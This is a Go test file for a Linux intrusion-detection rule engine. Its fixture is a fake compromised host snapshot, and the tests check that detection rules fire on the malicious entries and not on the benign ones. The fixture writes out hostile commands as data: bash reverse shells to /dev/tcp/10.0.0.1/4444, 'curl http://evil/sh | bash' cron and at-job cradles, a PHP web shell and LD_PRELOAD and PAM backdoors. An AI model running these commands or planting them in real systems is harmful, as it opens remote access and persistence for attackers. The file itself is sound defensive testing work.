package rules

import (
	"testing"

	"bladedr/internal/probe"
)

func fixtureSnapshot() *probe.Snapshot {
	return &probe.Snapshot{
		Schema: probe.SchemaSnapshot,
		Host:   probe.HostInfo{Hostname: "web-01", Arch: "amd64"},
		Processes: []probe.Process{
			{PID: 4711, Comm: "kworker/u8:2", Exe: "/tmp/.x/payload", ExeDeleted: true},
			{PID: 5012, Comm: "loader", ExeMemfd: true, Cmdline: "perl -e ..."},
			{PID: 900, Comm: "sshd", Exe: "/usr/sbin/sshd"},                                                // benign, must not match
			{PID: 6001, Comm: "haxdoor", Exe: "/usr/sbin/haxdoor", EnvironEmpty: true, PacketSocket: true}, // BPFDoor-like
			{PID: 6002, Comm: "dhclient", Exe: "/sbin/dhclient", PacketSocket: true},                       // benign sniffer (DHCP)
			{PID: 6100, Comm: "bash", Exe: "/bin/bash", Cmdline: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}, // reverse shell
			{PID: 6200, Comm: "nginx", Exe: "/usr/sbin/nginx", MappedLibsWritable: []string{"/tmp/.x/libhook.so"}},
			{PID: 6201, Comm: "postgres", Exe: "/usr/lib/postgresql/16/bin/postgres", MappedLibsDeleted: []string{"/run/.x/libgone.so"}},
			{PID: 6202, Comm: "cron", Exe: "/usr/sbin/cron", PreloadEnv: "LD_PRELOAD=/tmp/.x/evil.so"},
			{PID: 6203, Comm: "apache2", Exe: "/usr/sbin/apache2", PreloadEnv: ""},   // benign: no library finding
			{PID: 6300, PPID: 6200, Comm: "sh", Exe: "/bin/sh", Cmdline: "sh -c id"}, // webshell pivot: direct child of nginx (6200)
			{PID: 6301, PPID: 1, Comm: "bash", Exe: "/bin/bash", Cmdline: "bash"},    // benign: shell with no web-server parent
		},
		ListeningSockets: []probe.Socket{
			{Proto: "tcp", LAddr: "0.0.0.0", LPort: 4444, PID: 4711, Comm: "payload"},
			{Proto: "tcp", LAddr: "0.0.0.0", LPort: 22, PID: 900, Comm: "sshd"}, // benign
		},
		Persistence: probe.Persistence{
			LDPreload: probe.LDPreload{
				LDSoPreload: "/etc/ld.so.preload",
				Entries:     []string{"/tmp/evil.so"},
			},
			Cron: []probe.CronEntry{
				{Path: "/etc/cron.d/x", User: "root", Line: "* * * * * curl http://evil/sh | bash"},
				{Path: "/etc/cron.d/y", User: "root", Line: "*/5 * * * * root python3 -c 'import socket,os'"}, // GTFOBins/interpreter
				{Path: "/etc/cron.d/ok", User: "root", Line: "0 3 * * * /usr/bin/backup"},                     // benign
			},
			SystemdUnits: []probe.SystemdUnit{
				{Name: "evil.service", ExecStart: "/tmp/.x/payload --daemon"},                               // suspicious
				{Name: "nginx.service", ExecStart: "/usr/sbin/nginx", ExecPre: "/usr/sbin/nginx -t"},        // benign (ExecPre legit)
				{Name: "pre.service", ExecStart: "/usr/bin/app", ExecPre: "/var/tmp/.x/setup.sh"},           // ExecStartPre from writable
				{Name: "preload.service", ExecStart: "/usr/bin/app", Environment: "LD_PRELOAD=/tmp/x.so"},   // unit LD_PRELOAD injection
				{Name: "revsh.service", ExecStart: "/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"}, // reverse shell
			},
			AuthorizedKeys: []probe.AuthKeysFile{
				{Path: "/var/www/.ssh/authorized_keys", Owner: "www-data", OwnerNologin: true,
					Keys: []probe.AuthKey{{Type: "ssh-rsa", SHA256: "abc"}}}, // backdoor in service acct
				{Path: "/root/.ssh/authorized_keys", Owner: "root", OwnerNologin: false,
					Keys: []probe.AuthKey{{Type: "ssh-ed25519", SHA256: "def",
						Options: `environment="LD_PRELOAD=/tmp/evil.so"`}}}, // suspicious option
			},
		},
		SuspiciousFiles: []probe.FileEntry{
			{Path: "/tmp/rootshell", Mode: "4755", SUID: true},                  // suid in /tmp
			{Path: "/dev/shm/.x", Mode: "0755", Hidden: true},                   // hidden exec
			{Path: "/tmp/capbin", Mode: "0755", Caps: "0100000200000000000000"}, // file capabilities
			{Path: "/tmp/pspy64", Mode: "0755", Tool: "pspy"},                   // offensive tool
		},
		LibVersions: []probe.LibVersion{
			{Name: "liblzma", Path: "/usr/lib/x86_64-linux-gnu/liblzma.so.5.6.1", Version: "5.6.1"}, // backdoored
			{Name: "liblzma", Path: "/lib/x86_64-linux-gnu/liblzma.so.5.4.5", Version: "5.4.5"},     // benign
		},
		PathHijack: []string{"(cwd in PATH)", "/tmp/badpath"},
		OutboundConns: []probe.Conn{
			{Proto: "tcp", RAddr: "185.10.20.30", RPort: 3333}, // miner pool
		},
		PasswordlessAccounts: []string{"backdoor"},
		PrivGroupMembers: []probe.GroupMember{
			{Group: "docker", Member: "svc", Nologin: true},  // backdoor: service acct in docker
			{Group: "sudo", Member: "admin", Nologin: false}, // benign: real admin
		},
		KernelModules: []probe.KernelModule{
			{Name: "hideproc", OutOfTree: true, Signed: false},
			{Name: "ext4", OutOfTree: false, Signed: true}, // benign
		},
		Accounts: []probe.Account{
			{Name: "root", UID: 0, GID: 0, Shell: "/bin/bash"},               // benign
			{Name: "toor", UID: 0, GID: 0, Shell: "/bin/bash"},               // backdoor: UID 0 != root
			{Name: "www-data", UID: 33, GID: 33, Shell: "/usr/sbin/nologin"}, // benign
			{Name: "backdoor", UID: 33, GID: 100, Shell: "/bin/bash"},        // duplicate UID with www-data
			{Name: "legacyadm", UID: 1500, GID: 1500, Shell: "/bin/bash", PasswordScheme: "md5crypt"},
			{Name: "oldbatch", UID: 1501, GID: 1501, Shell: "/bin/bash", PasswordScheme: "des"},
			{Name: "appsvc", UID: 1502, GID: 1502, Shell: "/usr/sbin/nologin", PasswordScheme: "md5crypt"}, // cannot log in: benign
			{Name: "alice", UID: 1503, GID: 1503, Shell: "/bin/bash", PasswordScheme: "sha512crypt"},       // benign
		},
		PrivateKeys: []probe.PrivateKeyFile{
			{Path: "/root/.ssh/id_ed25519_leak", Owner: "root", Type: "ssh-ed25519", Mode: "0644"},
			{Path: "/home/alice/.ssh/id_ed25519", Owner: "alice", Type: "ssh-ed25519", Mode: "0600", Encrypted: true}, // benign
		},
		KernelLog: []probe.KernelLogEntry{
			{Seq: 100, Message: "device eth0 entered promiscuous mode"},                       // sniffing
			{Seq: 101, Message: "payload[4711]: segfault at 0 ip 00007f in /tmp/.x/payload"},  // exploit
			{Seq: 102, Message: "hideproc: loading out-of-tree module taints kernel"},         // LKM rootkit
			{Seq: 103, Message: "general protection fault: 0000 [#1] SMP PTI"},                // kernel exploit
			{Seq: 104, Message: "usb 1-1: new high-speed USB device number 2 using xhci_hcd"}, // benign
		},
		PromiscInterfaces: []string{"eth0"},                                               // physical NIC sniffing (virtual ifaces filtered upstream)
		OutOfTreeModules:  []string{"hideproc: loading out-of-tree module taints kernel"}, // LKM rootkit (legit DKMS filtered upstream)
		HiddenModules:     []string{"reptile_mod"},                                        // in /proc/modules, hidden from /sys/module
		PAMModules: []probe.PAMEntry{
			{Service: "sshd", Type: "auth", Module: "pam_evil.so", Path: "/tmp/pam_evil.so"},                     // backdoor
			{Service: "login", Type: "auth", Module: "pam_unix.so"},                                              // benign (no path)
			{Service: "sshd", Type: "auth", Module: "pam_exec.so", Args: "expose_authtok /usr/local/bin/log.sh"}, // password theft
			{Service: "sudo", Type: "session", Module: "pam_exec.so", Args: "/usr/sbin/legit-notify"},            // benign pam_exec
		},
		NsswitchUnusual:    []string{"passwd: backdoor"},                                                    // custom libnss module
		ProcMountHides:     []string{"/proc/31337"},                                                         // bind-mount process hiding
		SysctlHardeningOff: []string{"/etc/sysctl.d/10-evil.conf: kernel.yama.ptrace_scope=0"},              // persistent hardening-disable
		UnverifiedRepos:    []string{"/etc/apt/sources.list.d/evil.list: deb [trusted=yes] http://evil ./"}, // unsigned repo
		SshTunnels:         []string{"dynamic SOCKS proxy (-D): ssh -fND 1080 jump@10.0.0.1"},               // pivot tunnel
		InitramfsHooks: []probe.StartupScript{
			{Path: "/etc/initramfs-tools/hooks/x", SuspiciousLines: []string{"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}}, // boot persistence
		},
		K8sStaticPods: []probe.StartupScript{
			{Path: "/etc/kubernetes/manifests/pwn.yaml", SuspiciousLines: []string{"privileged:true", "hostPath mount"}}, // k8s node persistence
		},
		ExposedKubeconfigs: []string{"/etc/kubernetes/admin.conf"}, // cluster creds world-readable
		ShellHistoryTampering: []probe.StartupScript{
			{Path: "/root/.bashrc", SuspiciousLines: []string{"export HISTFILE=/dev/null"}}, // anti-forensics
		},
		TamperedLogs:     []string{"/var/log/auth.log -> /dev/null"}, // log wiping
		SuspiciousShells: []string{"svcbackdoor: /usr/bin/python3"},  // interpreter login shell
		WritableSuid: []probe.FileEntry{
			{Path: "/usr/local/bin/helper", Mode: "6777", SUID: true}, // SUID + world-writable
		},
		XdgAutostart: []probe.StartupScript{
			{Path: "/etc/xdg/autostart/x.desktop", SuspiciousLines: []string{"/tmp/.x/run.sh"}}, // GUI login persistence
		},
		SshClientCommands: []probe.StartupScript{
			{Path: "/root/.ssh/config", SuspiciousLines: []string{"LocalCommand /tmp/.x/run.sh"}}, // exec on connect
		},
		SystemdTimers: []probe.SystemdTimer{
			{Name: "evil.timer", Unit: "evil.service", OnCalendar: "OnCalendar=*-*-* *:00:00", ExecStart: "/tmp/.x/payload --tick"},                    // timer persistence
			{Name: "logrotate.timer", Unit: "logrotate.service", OnCalendar: "OnCalendar=daily", ExecStart: "/usr/sbin/logrotate /etc/logrotate.conf"}, // benign
		},
		SelinuxDisabled: []string{"/etc/selinux/config: SELINUX=disabled"}, // MAC layer turned off
		DnfPlugins: []probe.DnfPlugin{
			{Path: "/usr/lib/python3.9/site-packages/dnf-plugins/evil.py", Plugin: "evil"}, // non-root-writable plugin
		},
		PthFiles: []probe.PthFile{
			{Path: "/usr/lib/python3.11/site-packages/evil.pth", ImportLines: []string{"import os; os.system('id')"}},
		},
		ImmutableFiles: []string{"/etc/ld.so.preload"},
		UdevRules: []probe.UdevRule{
			{Path: "/etc/udev/rules.d/99-x.rules", Rule: `ACTION=="add", RUN+="/tmp/.x/run.sh"`},     // backdoor
			{Path: "/etc/udev/rules.d/70-ok.rules", Rule: `SUBSYSTEM=="net", RUN+="/usr/bin/legit"`}, // benign
		},
		BinfmtEntries: []probe.BinfmtEntry{
			{Name: "evil", Interpreter: "/dev/shm/interp"},           // shadow exec
			{Name: "python3.11", Interpreter: "/usr/bin/python3.11"}, // benign
		},
		StartupScripts: []probe.StartupScript{
			{Path: "/etc/profile.d/00-x.sh", SuspiciousLines: []string{"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}},
			{Path: "/etc/grub.d/40_custom", SuspiciousLines: []string{"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}}, // GRUB boot persistence
		},
		ShellInit: []probe.StartupScript{
			{Path: "/root/.bashrc", SuspiciousLines: []string{"alias ls='ls | grep -v evil'"}},
		},
		Supervisor: []probe.SupervisorProg{
			{Path: "/etc/supervisor/conf.d/x.conf", Program: "x", Command: "/tmp/.x/run --daemon"},  // backdoor
			{Path: "/etc/supervisor/conf.d/web.conf", Program: "web", Command: "/usr/bin/gunicorn"}, // benign
		},
		HiddenPIDs:      []int{31337},
		AtJobs:          []probe.StartupScript{{Path: "/var/spool/cron/atjobs/a00001", SuspiciousLines: []string{"curl http://evil/x | bash"}}},
		SuspiciousKsyms: []string{"diamorphine_init"},
		SudoRules: []probe.SudoRule{
			{Path: "/etc/sudoers.d/x", Line: "baduser ALL=(ALL) NOPASSWD: ALL"},                              // dangerous
			{Path: "/etc/sudoers", Line: "deploy ALL=(root) NOPASSWD: /usr/bin/systemctl restart app"},       // benign (scoped)
			{Path: "/etc/sudoers.d/z", Line: "webadmin ALL=(root) NOPASSWD: /usr/bin/find", GtfoBin: "find"}, // GTFOBins privesc
			{Path: "/etc/sudoers.d/e", Line: `Defaults env_keep += "LD_PRELOAD"`},                            // env_keep LD_ privesc
		},
		NfsExports: []string{
			"/srv *(rw,sync,no_root_squash)",    // dangerous
			"/data 10.0.0.0/24(ro,root_squash)", // benign
		},
		WorldWritableSensitive: []string{"/etc/passwd"},
		WebShells: []probe.StartupScript{
			{Path: "/var/www/html/up.php", SuspiciousLines: []string{"<?php system($_GET['c']); ?>"}},
		},
		BpfPinned: []string{"/sys/fs/bpf/rootkit_map"},
		BpfPrograms: []probe.BpfProg{
			{ID: 12, Type: "kprobe", Name: "pidhide", Tag: "a1b2c3d4e5f60718", GPL: true},       // bad-bpf marker
			{ID: 3, Type: "cgroup_skb", Name: "sd_devices", Tag: "0011223344556677", GPL: true}, // benign systemd
		},
		PackageHooks: []probe.PackageHook{
			{Path: "/etc/apt/apt.conf.d/99backdoor", Manager: "apt", Directive: "DPkg::Pre-Invoke", Command: "/tmp/.x/run.sh"}, // persistence
		},
		WebServerModules: []probe.WebServerModule{
			{Path: "/etc/apache2/mods-enabled/evil.load", Server: "apache", Module: "/tmp/evil_mod.so"}, // module backdoor
		},
		SuidBinaries: []probe.FileEntry{
			{Path: "/usr/bin/python3.11", Mode: "4755", SUID: true}, // GTFOBins SUID interpreter
		},
		WritablePersistence: []probe.WritablePersistenceEntry{{Path: "/etc/systemd/system/web.service", Via: "other", Mode: "0666"}}, // unit writable by non-root
		DangerousCapabilities: []probe.FileEntry{
			{Path: "/usr/bin/python3.11", Mode: "0755", Caps: "cap_setuid"}, // privesc capability
		},
		CronPathHijack: []string{"/etc/cron.d/x: PATH=/tmp/bin:/usr/bin"}, // writable dir in cron PATH
		ModprobeCommands: []probe.ModprobeCommand{
			{Path: "/etc/modprobe.d/x.conf", Directive: "install", Module: "evil", Command: "/tmp/.x/run.sh"}, // arbitrary cmd
		},
		LdSoConf: []probe.LdConfEntry{
			{Path: "/etc/ld.so.conf.d/x.conf", Dir: "/tmp/lib"}, // writable linker path
		},
		EnvPreload: []probe.StartupScript{
			{Path: "/etc/environment", SuspiciousLines: []string{"LD_PRELOAD=/tmp/evil.so"}}, // global preload
		},
		Facts: map[string]any{
			"core_pattern":                 "|/tmp/.x/collect %P", // suspicious pipe handler
			"docker_sock":                  true,                  // exposed docker socket
			"sshd_authorized_keys_command": "/tmp/keys.sh",        // sshd backdoor
			"kernel_taint_chars":           "FO",                  // forced module load (F)
			"yama_ptrace_scope":            0,                     // ptrace hardening disabled
		},
	}
}

func TestBuiltinRulesFireOnMaliciousSnapshot(t *testing.T) {
	rs, err := Builtin()
	if err != nil {
		t.Fatalf("load builtin rules: %v", err)
	}
	if len(rs) == 0 {
		t.Fatal("no builtin rules loaded")
	}
	eng, err := NewEngine(rs)
	if err != nil {
		t.Fatalf("compile engine: %v", err)
	}
	findings, err := eng.Evaluate(fixtureSnapshot())
	if err != nil {
		t.Fatalf("evaluate: %v", err)
	}

	got := map[string]int{}
	for _, f := range findings {
		got[f.RuleID]++
	}
	want := []string{
		"deleted-running-binary",
		"memfd-fileless-exec",
		"exec-from-world-writable",
		"masquerade-kernel-thread",
		"ld-so-preload-rootkit",
		"cron-download-cradle",
		"suspicious-port-listener",
		"unsigned-out-of-tree-module",
		"unexpected-uid0-account",
		"core-pattern-pipe-handler",
		"systemd-suspicious-execstart",
		"ssh-key-in-service-account",
		"suid-in-writable-path",
		"hidden-executable-in-writable",
		"docker-socket-exposed",
		"kernel-promiscuous-mode",
		"kernel-exploit-segfault",
		"kernel-out-of-tree-module-load",
		"kernel-oops-or-gpf",
		"sshd-backdoor-directive",
		"hidden-kernel-module",
		"kernel-forced-module-taint",
		"pam-module-unusual-path",
		"python-pth-code-execution",
		"immutable-sensitive-file",
		"udev-run-backdoor",
		"binfmt-interpreter-writable",
		"startup-script-cradle",
		"shell-rc-backdoor",
		"supervisor-command-writable",
		"hidden-process",
		"at-job-cradle",
		"kallsyms-rootkit-symbol",
		"authorized-keys-suspicious-option",
		"sudoers-dangerous-rule",
		"nfs-no-root-squash",
		"world-writable-sensitive-file",
		"file-capability-in-writable",
		"path-hijack-entry",
		"cron-suspicious-command",
		"miner-c2-outbound-connection",
		"passwordless-account",
		"service-account-in-privileged-group",
		"process-empty-environ",
		"packet-sniffer-process",
		"webshell-in-webroot",
		"liblzma-xz-backdoor",
		"offensive-tool-on-disk",
		"ebpf-program-rootkit-name",
		"package-manager-hook-backdoor",
		"web-server-module-writable",
		"modprobe-install-command",
		"ld-so-conf-writable-path",
		"global-ld-preload",
		"systemd-exec-directive-writable",
		"systemd-unit-ld-preload",
		"systemd-execstart-reverse-shell",
		"suid-shell-escape-binary",
		"writable-persistence-file",
		"dangerous-file-capability",
		"cron-path-hijack",
		"pam-exec-backdoor",
		"nsswitch-unusual-module",
		"shell-history-disabled",
		"log-file-symlinked",
		"proc-bind-mount-hidden-process",
		"yama-ptrace-scope-disabled",
		"sysctl-hardening-disabled",
		"package-repo-unverified",
		"ssh-tunnel-process",
		"initramfs-hook-cradle",
		"k8s-static-pod-suspicious",
		"k8s-kubeconfig-exposed",
		"login-shell-suspicious",
		"writable-suid-binary",
		"process-reverse-shell-cmdline",
		"sudo-gtfobins-binary",
		"xdg-autostart-suspicious",
		"sudo-env-keep-ld",
		"ssh-config-localcommand",
		"systemd-timer-suspicious",
		"selinux-disabled",
		"dnf-plugin-writable",
		"grub-script-cradle",
		"duplicate-uid-account",
	}
	for _, id := range want {
		if got[id] == 0 {
			t.Errorf("expected rule %q to fire, but it did not (findings: %v)", id, got)
		}
	}

	// These rules ship disabled (opt-in: noisy/environment-specific). Verify each is
	// present, disabled, and does not fire.
	byID := map[string]*Rule{}
	for i := range rs {
		byID[rs[i].ID] = &rs[i]
	}
	for _, id := range []string{"kernel-lockdown-disabled", "ebpf-pinned-object-toplevel"} {
		r := byID[id]
		if r == nil {
			t.Errorf("opt-in rule %q should be present", id)
		} else if r.IsEnabled() {
			t.Errorf("opt-in rule %q should ship disabled", id)
		}
		if got[id] != 0 {
			t.Errorf("disabled rule %q must not fire", id)
		}
	}

	// Benign entries must not trigger duplicate/false matches.
	if got["suspicious-port-listener"] != 1 {
		t.Errorf("port listener rule should fire exactly once, got %d", got["suspicious-port-listener"])
	}
	if got["unsigned-out-of-tree-module"] != 1 {
		t.Errorf("module rule should fire exactly once, got %d", got["unsigned-out-of-tree-module"])
	}
	if got["ebpf-program-rootkit-name"] != 1 {
		t.Errorf("eBPF rootkit-name rule should fire exactly once (benign program must not match), got %d", got["ebpf-program-rootkit-name"])
	}
	if got["pam-exec-backdoor"] != 1 {
		t.Errorf("pam-exec rule should fire exactly once (benign pam_exec must not match), got %d", got["pam-exec-backdoor"])
	}
	if got["sudo-gtfobins-binary"] != 1 {
		t.Errorf("sudo-gtfobins rule should fire exactly once (scoped systemctl must not match), got %d", got["sudo-gtfobins-binary"])
	}
	if got["unexpected-uid0-account"] != 1 {
		t.Errorf("uid0 rule should fire once (toor only, not root), got %d", got["unexpected-uid0-account"])
	}
	if got["systemd-suspicious-execstart"] != 1 {
		t.Errorf("systemd rule should fire once (evil.service, not nginx), got %d", got["systemd-suspicious-execstart"])
	}
	if got["systemd-timer-suspicious"] != 1 {
		t.Errorf("systemd-timer rule should fire once (evil.timer, not logrotate), got %d", got["systemd-timer-suspicious"])
	}
	if got["ssh-key-in-service-account"] != 1 {
		t.Errorf("ssh-key rule should fire once (www-data, not root), got %d", got["ssh-key-in-service-account"])
	}
	if got["pam-module-unusual-path"] != 1 {
		t.Errorf("pam rule should fire once (pam_evil from /tmp, not pam_unix), got %d", got["pam-module-unusual-path"])
	}
	if got["udev-run-backdoor"] != 1 {
		t.Errorf("udev rule should fire once (RUN from /tmp, not legit), got %d", got["udev-run-backdoor"])
	}
	if got["binfmt-interpreter-writable"] != 1 {
		t.Errorf("binfmt rule should fire once (/dev/shm, not /usr/bin), got %d", got["binfmt-interpreter-writable"])
	}
	if got["sudoers-dangerous-rule"] != 1 {
		t.Errorf("sudoers rule should fire once (NOPASSWD: ALL, not scoped systemctl), got %d", got["sudoers-dangerous-rule"])
	}
	if got["nfs-no-root-squash"] != 1 {
		t.Errorf("nfs rule should fire once (no_root_squash, not root_squash), got %d", got["nfs-no-root-squash"])
	}
	if got["service-account-in-privileged-group"] != 1 {
		t.Errorf("priv-group rule should fire once (svc nologin, not admin), got %d", got["service-account-in-privileged-group"])
	}
	if got["packet-sniffer-process"] != 1 {
		t.Errorf("packet-sniffer rule should fire once (haxdoor, not dhclient), got %d", got["packet-sniffer-process"])
	}
	for _, id := range []string{"process-library-from-writable-path", "process-library-deleted", "process-ld-preload-env"} {
		if got[id] != 1 {
			t.Errorf("%s should fire once (one process carries it; sshd and apache2 do not), got %d", id, got[id])
		}
	}
	if got["weak-password-hash-scheme"] != 2 {
		t.Errorf("weak-hash rule should fire for legacyadm and oldbatch only (not nologin, not sha512), got %d", got["weak-password-hash-scheme"])
	}
	if got["unprotected-ssh-private-key"] != 1 {
		t.Errorf("private-key rule should fire once (the unencrypted key, not the passphrase-protected one), got %d", got["unprotected-ssh-private-key"])
	}
	if got["process-empty-environ"] != 1 {
		t.Errorf("empty-environ rule should fire once (haxdoor), got %d", got["process-empty-environ"])
	}
	if got["liblzma-xz-backdoor"] != 1 {
		t.Errorf("xz rule should fire once (5.6.1, not 5.4.5), got %d", got["liblzma-xz-backdoor"])
	}
	if got["supervisor-command-writable"] != 1 {
		t.Errorf("supervisor rule should fire once (/tmp, not gunicorn), got %d", got["supervisor-command-writable"])
	}
	// dmesg rules: each matches exactly one entry; the benign USB line matches none.
	if got["kernel-promiscuous-mode"] != 1 {
		t.Errorf("promisc rule should fire once, got %d", got["kernel-promiscuous-mode"])
	}
	if got["kernel-out-of-tree-module-load"] != 1 {
		t.Errorf("oot-module rule should fire once, got %d", got["kernel-out-of-tree-module-load"])
	}
	if got["shell-child-of-web-server"] != 1 {
		t.Errorf("shell-child-of-web-server should fire once (sh, direct child of nginx 6200, not the unrelated bash under init), got %d", got["shell-child-of-web-server"])
	}
}

// TestShellChildOfWebServerEvidenceUsesParentKey pins the evidence key the rule
// reports the parent's exe under. internal/risk/model.go's parentClass buckets
// findings by the evidence key "parent" specifically (it is what the eBPF
// sensor's own evidence already uses, see internal/sensor/event.go), so this
// rule has to use that exact name to feed the same learned feature instead of a
// parallel one the model never sees.
func TestShellChildOfWebServerEvidenceUsesParentKey(t *testing.T) {
	rs, err := Builtin()
	if err != nil {
		t.Fatal(err)
	}
	var selected []Rule
	for _, r := range rs {
		if r.ID == "shell-child-of-web-server" {
			selected = append(selected, r)
		}
	}
	if len(selected) != 1 {
		t.Fatal("rule missing")
	}
	eng, err := NewEngine(selected)
	if err != nil {
		t.Fatal(err)
	}
	snap := &probe.Snapshot{Processes: []probe.Process{
		{PID: 100, Comm: "nginx", Exe: "/usr/sbin/nginx"},
		{PID: 101, PPID: 100, Comm: "sh", Exe: "/bin/sh", Cmdline: "sh -c id"},
	}}
	findings, err := eng.Evaluate(snap)
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) != 1 {
		t.Fatalf("want 1 finding, got %d", len(findings))
	}
	if got := findings[0].Evidence["parent"]; got != "/usr/sbin/nginx" {
		t.Errorf(`evidence["parent"] = %v, want "/usr/sbin/nginx"`, got)
	}
	if _, stillPresent := findings[0].Evidence["parent_exe"]; stillPresent {
		t.Error(`evidence still has the old "parent_exe" key`)
	}
}
